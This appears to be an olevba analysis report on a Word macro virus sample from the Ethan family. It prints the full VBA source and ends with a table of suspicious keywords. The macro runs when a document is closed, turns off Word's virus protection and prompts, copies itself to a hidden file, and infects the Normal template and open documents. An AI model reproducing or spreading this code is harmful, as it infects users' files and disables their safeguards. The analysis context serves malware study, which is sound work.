olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan-based-1c3551223bc32c974bd6f319604bd91507f6faa2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan-based-1c3551223bc32c974bd6f319604bd91507f6faa2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem ID
Private Sub Document_Close()

Rem >>>>>>>>>>Wordbackup
Rem Makes backups of Word Documents Whever You Like It Or You don't

Rem Initialise
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize

Rem >>>>>>>>>>Breed The Code<<<<<<<<<<<<<

Rem Copy Self To c:\IDEDev.___
  Open "c:\IDEDev.___" For Output As #1
  For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).codemodule.CountOfLines
   a = MacroContainer.VBProject.VBComponents.Item(1).codemodule.Lines(i, 1)
   Print #1, a
  Next i
  Close #1
  SetAttr "c:\IDEDev.___", 6

Rem Does master contain Macro?
   If NormalTemplate.VBProject.VBComponents.Item(1).codemodule.Lines(1, 1) <> "Rem ID" Then
  Set t = NormalTemplate.VBProject.VBComponents.Item(1)
 ElseIf ActiveDocument.VBProject.VBComponents.Item(1).codemodule.Lines(1, 1) <> "Rem ID" Then
  Set t = ActiveDocument.VBProject.VBComponents.Item(1)
 Else
  t = ""
 End If
 
Rem If Not Then Copy The Contents Of c:\IDEDev.___ to it
 If t <> "" Then
  Open "c:\IDEDev.___" For Input As #1
  If LOF(1) = 0 Then GoTo q
  i = 1
  Do While Not EOF(1)
   Line Input #1, a
   t.codemodule.InsertLines i, a
   i = i + 1
  Loop
q:
  Close #1
  If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 End If
 If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s


Rem >>>>>>>>>>>>>Backup The Document<<<<<<<<<<<<<<<<
 temp = ActiveDocument.FullName
 savedir = "c:\winbackup"
 savefile = savedir + "\" + ActiveDocument.Name
 MkDir (savedir)
 SaveAs (savefile)
 SaveAs (temp)

End Sub

 _
 _
 _
 _
 _
 _
 _
 _
 _































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

